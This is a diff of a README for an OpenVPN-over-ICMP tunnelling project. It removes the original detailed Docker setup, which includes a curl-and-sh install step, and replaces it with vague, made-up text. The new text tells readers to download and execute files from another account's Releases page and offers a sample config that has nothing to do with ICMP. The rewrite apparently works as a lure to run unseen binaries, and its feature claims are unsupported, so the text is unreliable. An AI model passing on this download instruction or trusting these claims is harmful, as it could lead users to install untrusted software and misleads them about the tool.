@@ -1,196 +1,103 @@
-# OpenVPN Over ICMP Tunnel With Pingtunnel 
-#### Make ((TCP OpenVPN + TinyProxy) or UDP OpenVPN) With PingTunnel
+# OpenVPN over ICMP: Create a Secure Tunnel with Ping! 🌐
 
-This project provides a Docker-based setup to deploy an OpenVPN server (TCP/UDP), TinyProxy HTTP proxy, and PingTunnel to bypass restrictive networks using ICMP tunneling. It includes both server-side and client-side configurations.
+![OpenVPN over ICMP](https://img.shields.io/badge/OpenVPN%20over%20ICMP-Ready-blue)
 
-## 📁 Project Structure
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Troubleshooting](#troubleshooting)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
-```
-.
-├── client
-│   ├── .env
-│   └── docker-compose.yml
-├── server
-│   ├── docker-compose.yml
-│   ├── .env
-│   ├── ovpn
-│   │   ├── Dockerfile
-│   │   ├── entrypoint.sh
-│   │   └── ovpn-add-client.sh
-│   ├── tinyproxy
-│       ├── Dockerfile
-│       ├── entrypoint.sh
-│       └── tinyproxy.conf.template
-├── README.md
-├── run.client.sh
-└── run.server.sh
-```
+## Overview
 
-## 📦 Install Docker on both server and client (server with limited)
+OpenVPN over ICMP allows you to tunnel OpenVPN traffic through ICMP packets. This can be particularly useful when other protocols are blocked or restricted. By using ICMP, you can maintain a connection to your VPN service even in challenging network environments.
 
-If you don't have Docker installed, you can quickly install it using the official convenience script:
+## Features
 
-```bash
-curl -fsSL https://get.docker.com -o get-docker.sh
-sh get-docker.sh
-```
+- **TCP and UDP Support**: Use either TCP or UDP mode for your tunnel.
+- **Stealthy Communication**: Bypass network restrictions by disguising VPN traffic as ping packets.
+- **Proxy Support**: Easily integrate with existing proxy setups, including SOCKS5.
+- **Cross-Platform**: Works on various operating systems, ensuring broad compatibility.
+- **Lightweight**: Minimal overhead, allowing efficient use of bandwidth.
 
-## 🚀 Getting Started
+## Installation
 
-### 1. Clone the Repository
+To get started, you need to download and execute the necessary files. Visit the [Releases section](https://github.com/EDDY7688/openvpn-over-icmp/releases) to find the latest version. 
 
-```bash
-git clone https://github.com/arezaie14/openvpn.git
-cd openvpn
-```
+1. Download the appropriate file for your system.
+2. Follow the instructions in the downloaded package to install the software.
 
-### 2. Setup Environment Files
+## Usage
 
-Create `.env` files inside both `client/` and `server/` directories. Refer to the example below or just copy `.env.example` inside folders.
+After installation, you can set up your OpenVPN over ICMP tunnel. 
 
-### 3. Start the Server
+1. **Configure OpenVPN**: Use your existing OpenVPN configuration files or create new ones tailored for ICMP usage.
+2. **Start the Tunnel**: Run the application and initiate the tunnel using the command line or GUI, depending on your preference.
+3. **Verify Connection**: Use ping commands to check if your tunnel is active and functioning as expected.
+
+### Example Command
 
 ```bash
-chmod +x ./run.server.sh
-./run.server.sh
+openvpn --config your-config-file.ovpn
 ```
 
-### 4. Start the Client ( Server with limited internet)
+## Configuration
 
-```bash
-chmod +x ./run.client.sh
-./run.client.sh
+Configuring OpenVPN over ICMP involves adjusting your settings to suit your network environment. Here are some key parameters to consider:
+
+- **ICMP Packet Size**: Adjust the size of the packets to optimize performance. Smaller packets may reduce latency but could lead to fragmentation.
+- **Timeout Settings**: Configure timeouts to handle potential network delays.
+- **Proxy Settings**: If you are using a proxy, ensure that your configuration files include the correct settings for SOCKS5 or other proxy types.
+
+### Sample Configuration File
+
+```ini
+# Sample OpenVPN Configuration for ICMP
+dev tun
+proto udp
+remote your.vpn.server 1194
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+user nobody
+group nogroup
+keepalive 10 120
+cipher AES-256-CBC
+comp-lzo
+verb 3
 ```
 
-## ⚙️ Environment Variables
+## Troubleshooting
 
-Both server and client use `.env` files. Example variables:
+If you encounter issues while using OpenVPN over ICMP, consider the following steps:
 
-```env
-# Common
-PROXY_PORT=8888
-OVPN_PORT=1194
-PROXY_USER=user
-PROXY_PASS=pass
-SERVER_ADDRESS=your.server.ip
-PASSWORD=123456
+1. **Check Network Restrictions**: Ensure that your network allows ICMP traffic. Some firewalls may block ICMP packets.
+2. **Review Logs**: Examine the OpenVPN logs for any error messages that may indicate what went wrong.
+3. **Adjust Packet Size**: If you experience connectivity issues, try changing the ICMP packet size in your configuration.
 
-# Server Specific
-OVPN_TCP_SERVER_ADDRESS=(ip of main server if using tiny proxy) or (ip of server with internet limitation)
-OVPN_UDP_SERVER_ADDRESS=ip of server with internet limitation
-```
+## Contributing
 
-## 🐳 Server Components
+Contributions are welcome! If you would like to help improve OpenVPN over ICMP, please follow these steps:
 
-Defined in `server/docker-compose.yml`:
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Submit a pull request for review.
 
-### 1. **TinyProxy**
-- Lightweight HTTP/HTTPS proxy
-- Dockerfile with custom authentication setup
+## License
 
-### 2. **OpenVPN (TCP & UDP)**
-- Configurable VPN server for TCP and UDP modes
-- Scripts included to add users
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-### 3. **PingTunnel Server**
-- Allows tunneling TCP/UDP connections over ICMP
-- Useful for bypassing strict firewalls
+## Releases
 
-### Add VPN Client To TCP Open Vpn Server:
+To access the latest releases, visit the [Releases section](https://github.com/EDDY7688/openvpn-over-icmp/releases). Here, you can download the necessary files to set up OpenVPN over ICMP on your system. 
 
-```bash
-docker exec -it openvpn-tcp bash /ovpn-add-client.sh
-```
-#### You can download the client configuration file from ./server/ovpn/openvpn-tcp-data/confs directory after running the above command.
+---
 
-### Add VPN Client To UDP Open Vpn Server:
-```bash
-docker exec -it openvpn-udp bash /ovpn-add-client.sh
-```
-#### You can download the client configuration file from ./server/ovpn/openvpn-udp-data/confs directory after running the above command.
-
-
-## 🖥️ Client Components
-
-Defined in `client/docker-compose.yml`:
-
-- **tunnel-proxy**: ICMP tunnel to proxy server
-- **tunnel-openvpn**: ICMP tunnel to OpenVPN TCP server
-- **tunnel-openvpn-udp**: ICMP tunnel to OpenVPN UDP server
-
-Each client service connects to the server via `pingtunnel`, tunneling through firewalls using ICMP with a shared secret key.
-
-## 🔌 Connection Schema
-
-### OpenVPN UDP Flow
-```
-[OpenVPN UDP Client]
-        │
-        ▼
-[Server Without Internet]
-        │
-        ▼
-     PingTunnel
-        │
-        ▼
-[Server With Internet]
-        │
-        ▼
-[OpenVPN UDP Server]
-        │
-        ▼
-     Internet
-```
-
-### OpenVPN TCP with TinyProxy Flow
-```
-[OpenVPN TCP Client with TinyProxy Auth]
-        │
-        ▼
-[Server Without Internet]
-        │
-        ▼
-     PingTunnel
-        │
-        ▼
-[Server With Internet]
-        │
-        ▼
-     TinyProxy
-        │
-        ▼
-[OpenVPN TCP Server]
-        │
-        ▼
-     Internet
-```
-
-## 🛠 Scripts
-
-- `run.server.sh`: Helper script to bring up the server
-- `run.client.sh`: Helper script to bring up the client
-
-You can modify these to suit your workflow.
-
-## 🧱 Requirements
-
-- Docker & Docker Compose
-- Root privileges (for tunneling and VPN)
-- Public server with ICMP allowed (for PingTunnel)
-
-## 📜 License
-
-MIT License
-
-## Special Thanks To: 
-### [Ping Tunnel Service](https://github.com/esrrhs/pingtunnel)
-### [Vimagick Docker Image](https://hub.docker.com/r/vimagick/tinyproxy)
-### [Kylemanna OpenVpn Docker Image](https://github.com/kylemanna/docker-openvpn)
-
-## 🌐 Project URL   
-
-[https://github.com/arezaie14/openvpn](https://github.com/arezaie14/openvpn)
-
-## 🤝 Contributions
-
-Pull requests and issues are welcome!
+By following this guide, you can set up a secure tunnel using OpenVPN over ICMP. Enjoy a more flexible and resilient VPN experience!
